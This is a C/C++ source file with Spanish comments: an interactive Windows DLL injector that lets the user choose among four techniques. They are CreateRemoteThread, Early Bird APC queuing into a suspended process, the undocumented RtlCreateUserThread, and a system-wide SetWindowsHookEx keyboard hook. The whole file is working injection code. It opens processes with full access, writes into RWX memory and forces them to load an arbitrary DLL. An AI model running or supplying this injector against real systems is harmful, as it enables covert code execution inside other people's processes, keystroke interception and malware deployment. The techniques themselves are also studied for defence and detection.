#include <stdio.h>
#include <windows.h>
#include <iostream>

/*
    Nota: Si el proceso objetivo es x64, la DLL y el proceso inyector también deben estar preparadas para esta plataforma
*/

//The prototype of RtlCreateUserThread from undocumented.ntinternals.com
typedef DWORD(WINAPI* functypeRtlCreateUserThread)(
    HANDLE                     ProcessHandle,
    PSECURITY_DESCRIPTOR     SecurityDescriptor,
    BOOL                     CreateSuspended,
    ULONG                    StackZeroBits,
    PULONG                    StackReserved,
    PULONG                    StackCommit,
    LPVOID                    StartAddress,
    LPVOID                    StartParameter,
    HANDLE                     ThreadHandle,
    LPVOID                    ClientID
    );

//The prototype of NtCreateThreadEx from undocumented.ntinternals.com
typedef DWORD(WINAPI* functypeNtCreateThreadEx)(
    PHANDLE                 ThreadHandle,
    ACCESS_MASK             DesiredAccess,
    LPVOID                  ObjectAttributes,
    HANDLE                  ProcessHandle,
    LPTHREAD_START_ROUTINE  lpStartAddress,
    LPVOID                  lpParameter,
    BOOL                    CreateSuspended,
    DWORD                   dwStackSize,
    DWORD                   Unknown1,
    DWORD                   Unknown2,
    LPVOID                  Unknown3
    );

void injCreateRemoteThread();

void injQueueUserApc();

void injCreateUserThread();

void injSetWindowsHookEx();

int main() {
    int method;
    printf("Select DLL Injection \n(1=CreateRemoteThread, 2=QueueUserApc, 3=CreateUserThread, 4=SetWindowsHookEx): ");
    scanf_s("%d", &method);

    switch (method) {
    case 1: //CreateRemoteThread
        injCreateRemoteThread();
        break;
    case 2: //Early Bird APC Queue Code Injection
        injQueueUserApc();
        break;
    case 3: //CreateUserThread
        injCreateUserThread();
        break;
    case 4: //SetWindowsHookEx
        injSetWindowsHookEx();
        break;
    }
	return 0;
}

void injCreateRemoteThread() {
    char dllPath[255];
    printf("Path de la dll a inyectar: ");
    scanf_s("%s", dllPath, sizeof(dllPath));

    int processId;
    printf("Id del proceso objetivo: ");
    scanf_s("%d", &processId);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL || hProcess == INVALID_HANDLE_VALUE) {
        printf("No se pudo abrir el proceso objetivo\n");
        exit(0);
    }

    // Asignamos memoria en el proceso objetivo
    PVOID remoteMemory = VirtualAllocEx(hProcess, NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    printf("Remote memory: %p\n", remoteMemory);

    // Escribimos el nombre de la dll que queremos que el proceso objetivo cargue
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(hProcess, remoteMemory, dllPath, sizeof(dllPath), &bytesWritten);
    if (bytesWritten == 0) {
        printf("\nNo se pudo inyectar el path de la DLL en el proceso objetivo\n");
        exit(EXIT_FAILURE);
    }

    // Creamos un thread que invoca loadlibrary en el proceso destino
    DWORD threadId = 0;
    HANDLE threadHandle = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibraryA, remoteMemory, 0, &threadId);
    if (threadHandle == 0) {
        DWORD err = GetLastError();
        printf("\nNo se pudo crear el hilo de ejecucion en el proceso objetivo\n");
        exit(EXIT_FAILURE);
    }
}

void injQueueUserApc() {
    char dllPath[255];
    printf("Path de la dll a inyectar: ");
    scanf_s("%s", dllPath, sizeof(dllPath));

    char processName[255];
    printf("Path del proceso objetivo: ");
    scanf_s("%s", processName, sizeof(processName));

    SIZE_T dllPathSize = sizeof(dllPath);
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    CreateProcessA(processName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    HANDLE victimProcess = pi.hProcess;
    HANDLE threadHandle = pi.hThread;

    LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, dllPathSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;

    WriteProcessMemory(victimProcess, shellAddress, dllPath, dllPathSize, NULL);
    DWORD res = QueueUserAPC((PAPCFUNC)LoadLibraryA, threadHandle, (ULONG_PTR)shellAddress);
    if (res == 0) {
        DWORD err = GetLastError();
    }

    ResumeThread(threadHandle);
}

void injCreateUserThread() {
    char dllPath[255];
    printf("Path de la dll a inyectar: ");
    scanf_s("%s", dllPath, sizeof(dllPath));

    int processId;
    printf("Id del proceso objetivo: ");
    scanf_s("%d", &processId);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL || hProcess == INVALID_HANDLE_VALUE) {
        printf("No se pudo abrir el proceso objetivo\n");
        exit(0);
    }

    // Asignamos memoria en el proceso objetivo
    PVOID remoteMemory = VirtualAllocEx(hProcess, NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    printf("Remote memory: %p\n", remoteMemory);

    // Escribimos el nombre de la dll que queremos que el proceso objetivo cargue
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(hProcess, remoteMemory, dllPath, sizeof(dllPath), &bytesWritten);
    if (bytesWritten == 0) {
        printf("\nNo se pudo inyectar el path de la DLL en el proceso objetivo\n");
        exit(EXIT_FAILURE);
    }

    // Obtenemos un Handle a NTDLL.DLL que contiene la funcion CreateUserThread
    HMODULE hNtDllModule = GetModuleHandleA("ntdll.dll");
    if (hNtDllModule == NULL) {
        exit(EXIT_FAILURE);
    }

    // Instanciamos la funci�n
    functypeRtlCreateUserThread funcRtlCreateUserThread = (functypeRtlCreateUserThread)GetProcAddress(hNtDllModule, "RtlCreateUserThread");
    if (!funcRtlCreateUserThread) {
        exit(EXIT_FAILURE);
    }
    // Creamos un thread que invoca LoadLibraryA en el proceso destino usando CreateUserThread
    HANDLE thread_id = NULL;
    funcRtlCreateUserThread(hProcess, NULL, 0, 0, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, remoteMemory, &thread_id, NULL);
}

void injSetWindowsHookEx() {
    char dllPath[255];
    printf("Path de la dll a inyectar: ");
    scanf_s("%s", dllPath, sizeof(dllPath));

    // Cargamos la dll
    HMODULE dll = LoadLibraryA((LPCSTR)dllPath);
    if (dll == NULL) {
        printf("No se encontro la DLL.\n");
        exit(EXIT_FAILURE);
    }

    // Obtenemos la direcci�n de la funci�n dentro de la dll
    HOOKPROC address = (HOOKPROC)GetProcAddress(dll, "meconnect");

    // Hookeamos la funcion
    HHOOK handle = SetWindowsHookEx(WH_KEYBOARD, address, dll, 0);
    getchar();
    UnhookWindowsHookEx(handle);
}